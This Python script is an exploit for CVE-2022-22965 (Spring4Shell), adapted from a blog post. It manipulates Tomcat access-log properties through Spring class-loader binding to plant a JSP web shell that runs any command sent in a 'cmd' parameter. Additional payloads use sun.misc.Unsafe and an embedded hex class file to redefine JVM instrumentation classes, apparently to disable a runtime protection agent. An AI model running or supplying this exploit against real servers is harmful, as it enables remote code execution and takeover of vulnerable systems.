# adapted from https://aquasosal.tistory.com/24

from urllib.parse import urlparse
import requests
import argparse
import urllib3
import time

urllib3.disable_warnings()

BASE_ADDRESS_PROVIDER_BACKDOOR = """%{directive}i page import="java.lang.instrument.UnmodifiableClassException,java.lang.instrument.Instrumentation,java.lang.instrument.ClassDefinition,sun.misc.Unsafe,java.lang.reflect.Field,java.lang.reflect.Method,java.lang.*,java.util.*,java.io.*,java.nio.*" %{endtag}i %{starttag}i 
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);  
        String mapsFilePath = "/proc/self/maps";
        String base = null;
        try (BufferedReader reader = new BufferedReader(new FileReader(mapsFilePath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("libjvm.so") && line.contains("r-xp")) {
                    base = line.split("-")[0].trim();
                }
            }
        } catch (IOException e) {
        }
        long libJvmSoBaseAddressLong = 0;
        if (base != null) {
            libJvmSoBaseAddressLong = Long.parseLong(base, 16);
        } else {
        }
        String offsetOfJvmtiEnvBase_head_environmentString = "0x0000000000f59750";
        long symbolOffset = Long.parseLong(offsetOfJvmtiEnvBase_head_environmentString.substring(2), 16);
        Long absoluteAddressHeadEnvironmentAddress = libJvmSoBaseAddressLong + symbolOffset;
        long jvmtiEnvAddress = unsafe.getLong(absoluteAddressHeadEnvironmentAddress);
        long envLocalStorateAddress = jvmtiEnvAddress + 4 * 8;
        long envLocalStorageValuePointed = unsafe.getLong(envLocalStorateAddress);
        long mAgentAddress = unsafe.getLong(envLocalStorageValuePointed + 8);
        long objectAddress = unsafe.getLong(mAgentAddress + 56);
        out.println(objectAddress);
         %{endtag}i         
         """

REDEFINE_TRANSFORMER_MANAGER = """%{directive}i page import="java.lang.instrument.UnmodifiableClassException,java.lang.instrument.Instrumentation,java.lang.instrument.ClassDefinition,sun.misc.Unsafe,java.lang.reflect.Field,java.lang.reflect.Method,java.lang.*,java.util.*,java.io.*,java.nio.*" %{endtag}i %{starttag}i 
    if(request.getParameter("%{parameter}i") != null){
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);  
        long base = Long.parseLong(request.getParameter("%{parameter}i"));
        Instrumentation inst = (Instrumentation) getObject(unsafe, unsafe.getLong(base));
        redefineTransformerManager(inst);
        out.println("TransformerManager patched ! ^^");
        }        
         %{endtag}i     
     
      %{startfunctiontag}i 
          public static void redefineTransformerManager(Instrumentation instrumentation) throws ClassNotFoundException, UnmodifiableClassException {
                String hexClass = "cafebabe00000037007f0a000f006007006109000e006209000e00630a006400650a000200660a000200670a000e00680b002e006907006a0a0002006b07006c0a0002006d07006e07006f01000f5472616e73666f726d6572496e666f01000c496e6e6572436c61737365730100106d5472616e73666f726d65724c6973740100345b4c73756e2f696e737472756d656e742f5472616e73666f726d65724d616e61676572245472616e73666f726d6572496e666f3b0100126d497352657472616e73666f726d61626c650100015a0100063c696e69743e010004285a2956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100234c73756e2f696e737472756d656e742f5472616e73666f726d65724d616e616765723b010011697352657472616e73666f726d61626c6501000328295a01000e6164645472616e73666f726d657201002e284c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b295601000b7472616e73666f726d657201002b4c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b0100076f6c644c6973740100076e65774c69737401001172656d6f76655472616e73666f726d657201002e284c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b295a0100017801000149010005666f756e640100096f6c644c656e6774680100096e65774c656e67746801000d6d61746368696e67496e64657801000d537461636b4d61705461626c65070070070013010013696e636c756465735472616e73666f726d6572010004696e666f0100334c73756e2f696e737472756d656e742f5472616e73666f726d65724d616e61676572245472616e73666f726d6572496e666f3b01001a676574536e617073686f745472616e73666f726d65724c69737401003628295b4c73756e2f696e737472756d656e742f5472616e73666f726d65724d616e61676572245472616e73666f726d6572496e666f3b0100097472616e73666f726d010072284c6a6176612f6c616e672f4d6f64756c653b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f436c6173733b4c6a6176612f73656375726974792f50726f74656374696f6e446f6d61696e3b5b42295b4201000f7472616e73666f726d6572496e666f0100107472616e73666f726d656442797465730100025b42010006726573756c740100066d6f64756c650100124c6a6176612f6c616e672f4d6f64756c653b0100066c6f616465720100174c6a6176612f6c616e672f436c6173734c6f616465723b010009636c6173736e616d650100124c6a6176612f6c616e672f537472696e673b010013636c6173734265696e675265646566696e65640100114c6a6176612f6c616e672f436c6173733b01001070726f74656374696f6e446f6d61696e0100204c6a6176612f73656375726974792f50726f74656374696f6e446f6d61696e3b01000f636c61737366696c65427566666572010019736f6d656f6e65546f756368656454686542797465636f646501000f7472616e73666f726d65724c69737401000b627566666572546f5573650100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b0700710700720700730700740700390100095369676e6174757265010075284c6a6176612f6c616e672f4d6f64756c653b4c6a6176612f6c616e672f436c6173734c6f616465723b4c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f436c6173733c2a3e3b4c6a6176612f73656375726974792f50726f74656374696f6e446f6d61696e3b5b42295b420100136765745472616e73666f726d6572436f756e740100032829490100157365744e61746976654d6574686f64507265666978010040284c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b4c6a6176612f6c616e672f537472696e673b295a01000c615472616e73666f726d65720100067072656669780100176765744e61746976654d6574686f64507265666978657301001528295b4c6a6176612f6c616e672f537472696e673b01000870726566697865730100135b4c6a6176612f6c616e672f537472696e673b07005b01000a536f7572636546696c650100175472616e73666f726d65724d616e616765722e6a61766101000b4e6573744d656d626572730c0016007501003173756e2f696e737472756d656e742f5472616e73666f726d65724d616e61676572245472616e73666f726d6572496e666f0c001200130c001400150700760c007700780c001600790c0021007a0c003300340c003500360100136a6176612f6c616e672f5468726f7761626c650c007b007c0100106a6176612f6c616e672f537472696e670c007d007e01002173756e2f696e737472756d656e742f5472616e73666f726d65724d616e616765720100106a6176612f6c616e672f4f626a6563740100296a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65720100106a6176612f6c616e672f4d6f64756c650100156a6176612f6c616e672f436c6173734c6f6164657201000f6a6176612f6c616e672f436c61737301001e6a6176612f73656375726974792f50726f74656374696f6e446f6d61696e0100032829560100106a6176612f6c616e672f53797374656d0100096172726179636f707901002a284c6a6176612f6c616e672f4f626a6563743b494c6a6176612f6c616e672f4f626a6563743b49492956010051284c73756e2f696e737472756d656e742f5472616e73666f726d65724d616e616765723b4c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b295601002d28294c6a6176612f6c616e672f696e737472756d656e742f436c61737346696c655472616e73666f726d65723b010009736574507265666978010015284c6a6176612f6c616e672f537472696e673b295601000967657450726566697801001428294c6a6176612f6c616e672f537472696e673b0021000e000f0000000200020012001300000002001400150000000a000000160017000100180000005200020002000000122ab700012a03bd0002b500032a1bb50004b10000000200190000001200040000005300040054000c005500110056001a00000016000200000012001b001c000000000012001d001500010000001d001e000100180000002f00010001000000052ab40004ac00000002001900000006000100000059001a0000000c000100000005001b001c00000021001f0020000100180000008500060004000000292ab400034d2cbe0460bd00024e2c032d032cbeb800052d2cbebb0002592a2bb70006532a2db50003b10000000200190000001a00060000005e0005005f000d0060001600650023006600280067001a0000002a000400000029001b001c00000000002900210022000100050024002300130002000d001c002400130003002100250026000100180000016f0006000800000073033d2ab400034e2dbe360415040464360503360615040464360715079b001d2d150732b600072ba6000c043d15073606a700098407ffa7ffe41c9900371505bd00023a0715069e000d2d031907031506b8000515061505a200142d15060460190715061505150664b800052a1907b500031cac00000003002d000000340006ff001a000807000e07002e0107002f0101010100001805ff0019000807000e07002e0107002f01010107002f000017fa000500190000004e00130000006b0002006c0007006d000b006e0011007200140073001f0074002a0075002c007600300077003300730039007c003d007d004400800049008100530089005a008a006b009000710092001a0000005c0009001a001f0027002800070044002d00240013000700000073001b001c000000000073002100220001000200710029001500020007006c002300130003000b0068002a0028000400110062002b002800050014005f002c002800060020003000260001001800000091000200060000002a2ab400034d2cbe3e03360415041da2001a2c1504323a051905b600072ba6000504ac840401a7ffe603ac00000003002d000000130003fe000b07002f0101fc0016070002fa00050019000000160005000000970017009800200099002200970028009c001a0000002000030017000b0031003200050000002a001b001c00000000002a002100220001000200330034000100180000002f00010001000000052ab40003b0000000020019000000060001000000a5001a0000000c000100000005001b001c000000010035003600020018000001db0001000f000000671906b00000bf0000000000bf000000bf0000bf00000000000000bf000000000000bf000000000000bf0000bf0000000000000000000000000000000000bf0000bf00bf00000000bf0000bf000000bf0000000000bf00000000bf000000bf0000bf0000bf0000bf00000004002d000000580014ff00030000000107000a4207000a4507000a4307000a4207000a4707000a4607000a4607000a4207000a5107000a4207000a4107000a4407000a4207000a4307000a4507000a4407000a4307000a4207000a4207000a00190000004a0012000300af000600b1000c00b3001000b6001b00b7002200b8002900b9002c00bc003e00c6004100c3004300c8004800c9004b00ca004f00b6005500d1005a00d2006100d5006400d8001a000000a200100022002d00370032000b0029002600210022000c002c002300380039000d0013004200270028000a005e0003003a0039000a00030064001b001c000000030064003b003c000100030064003d003e000200030064003f0040000300030064004100420004000300640043004400050003006400450039000600060061004600150007000c005b0047001300080010005700480039000900640003003a0039000a00490000000c0001000300640041004a00040050000000020051000000520053000100180000004000010002000000082ab600084c2bbeac0000000200190000000a0002000000de000500df001a00000016000200000008001b001c00000005000300470013000100000054005500010018000000d300020007000000322ab600084e03360415042dbea200242d1504323a051905b600073a0619062ba6000b19052cb6000b04ac840401a7ffdb03ac00000003002d000000150003fd000807002f01fd002107000207002ef900050019000000260009000000e4000500e6000f00e7001500e8001c00ea002200eb002800ec002a00e6003000ef001a00000048000700150015003700320005001c000e0056002200060008002800270028000400000032001b001c000000000032002100220001000000320057004000020005002d00470013000300000058005900010018000000a500030005000000282ab600084c2bbebd000c4d033e1d2bbea200162b1d323a042c1d1904b6000d53840301a7ffea2cb000000003002d0000000d0002fe000d07002f07005c011800190000001e0007000000f5000500f6000b00f8001300f9001800fa002000f8002600fc001a00000034000500180008003700320004000d001900270028000300000028001b001c000000050023004700130001000b001d005a005b0002000300110000000a00010002000e00100002005d00000002005e005f0000000400010002";
                byte[] byteArray = hexStringToByteArray(hexClass);
                Class<?> clazz = Class.forName("sun.instrument.TransformerManager");
                ClassDefinition def = new ClassDefinition(clazz, byteArray);
                instrumentation.redefineClasses(def);
                System.out.println(clazz.getName() + " redefined");
            }
         %{endtag}i
         
           %{startfunctiontag}i 
            public static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;}
             %{endtag}i
         
         %{startfunctiontag}i 
          public static Object getObject(Unsafe unsafe, long address) {
        Object[] objects = new Object[1];
        long arrayBaseOffset = unsafe.arrayBaseOffset(Object[].class);
        unsafe.putLong(objects, arrayBaseOffset, address);
        return objects[0];}
          %{endtag}i 
         """

REDEFINE_PROCESSBUILDER = """%{directive}i page import="java.lang.instrument.UnmodifiableClassException,java.lang.instrument.Instrumentation,java.lang.instrument.ClassDefinition,sun.misc.Unsafe,java.lang.reflect.Field,java.lang.reflect.Method,java.lang.*,java.util.*,java.io.*,java.nio.*" %{endtag}i %{starttag}i 
    if(request.getParameter("%{parameter}i") != null){
        Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");theUnsafeField.setAccessible(true);Unsafe unsafe = (Unsafe) theUnsafeField.get(null);  
        long base = Long.parseLong(request.getParameter("%{parameter}i")); Instrumentation inst = (Instrumentation) getObject(unsafe, unsafe.getLong(base));
        redefineProcessBuilder(inst);out.println("ProcessBuilder modified hehe ^^");}        
         %{endtag}i     
                  
           %{startfunctiontag}i 
        public static void redefineProcessBuilder(Instrumentation instrumentation) throws IOException, UnmodifiableClassException, ClassNotFoundException {
        byte[] classBytes = Objects.requireNonNull(ClassLoader.getSystemResourceAsStream("java/lang/ProcessBuilder.class")).readAllBytes();
        instrumentation.redefineClasses(new ClassDefinition(ProcessBuilder.class, classBytes));
    }
             %{endtag}i
         
         %{startfunctiontag}i 
          public static Object getObject(Unsafe unsafe, long address) {
        Object[] objects = new Object[1];
        long arrayBaseOffset = unsafe.arrayBaseOffset(Object[].class);
        unsafe.putLong(objects, arrayBaseOffset, address);
        return objects[0];}
          %{endtag}i 
         """

EXPLOIT = """%{directive}i page import="java.util.*,java.io.*" %{endtag}i %{starttag}i if(request.getParameter("%{parameter}i") != null){Process p = Runtime.getRuntime().exec(request.getParameter("%{parameter}i"));OutputStream os = p.getOutputStream();InputStream in = p.getInputStream();DataInputStream dis = new DataInputStream(in);String disr = dis.readLine();while ( disr != null ) {out.println(disr);disr = dis.readLine();}} %{endtag}i"""

classes = [
    'class.module.classLoader.resources.context.parent.pipeline.first.pattern',
    'class.module.classLoader.resources.context.parent.pipeline.first.suffix',
    'class.module.classLoader.resources.context.parent.pipeline.first.directory',
    'class.module.classLoader.resources.context.parent.pipeline.first.prefix',
    'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat',
]

Template_Variable = {
    'directive': '<%@',
    'endtag': '%>',
    'starttag': '<%',
    'startfunctiontag': '<%!',
    'parameter': 'cmd'
}


def argv():
    parser = argparse.ArgumentParser(description='CVE-2022-22965 RCE Exploit')

    parser.add_argument('--url', help='target url EX) --url=http://localhost:8080',
                        default="http://localhost:8080/exploit/greeting", dest="target", required=True)
    parser.add_argument('--file', help='WebShell file name to write to EX) --file=cmd', default="cmd", dest="filename")
    parser.add_argument('--dir', help='WebShell Directory Path to Write to. EX) --dir=webapps/ROOT',
                        default="webapps/ROOT")

    args = parser.parse_args()

    return args.filename, args.dir, args.target


def exploit():
    filename, directory, target = argv()

    if filename == "exploit":
        pattern = EXPLOIT
    elif filename == "base":
        pattern = BASE_ADDRESS_PROVIDER_BACKDOOR
    elif filename == "redefineTransformer":
        pattern = REDEFINE_TRANSFORMER_MANAGER
    elif filename == "redefineProcessBuilder":
        pattern = REDEFINE_PROCESSBUILDER
    else:
        raise Exception("filename does not match")

    payloads = {
        classes[0]: pattern,
        classes[1]: '.jsp',
        classes[2]: directory,
        classes[-2]: filename,
        classes[-1]: '',
    }

    res = requests.post(target, data={classes[-1]: '_'})
    print(f"\033[92m[+] INFO - {classes[0]} Resetting : _")

    res = requests.post(target, data=payloads)
    print(f"\033[92m[+] INFO - POST Response status code : {res.status_code}\033[0m")

    time.sleep(3)

    res = requests.get(target, headers=Template_Variable)

    print(f"\033[92m[+] INFO - GET Response status code : {res.status_code}\033[0m")

    time.sleep(1)

    res = requests.post(target, data={classes[0]: ''})

    print(f"\033[92m[+] INFO - Exploit Success\033[0m\n")

    parse_target = urlparse(target)
    shellurl = f"{parse_target.scheme}://{parse_target.netloc}/{filename}.jsp"

    print(f"\033[95m[*] INFO - WebShell URL : {shellurl}\033[0m")


if __name__ == '__main__':
    exploit()
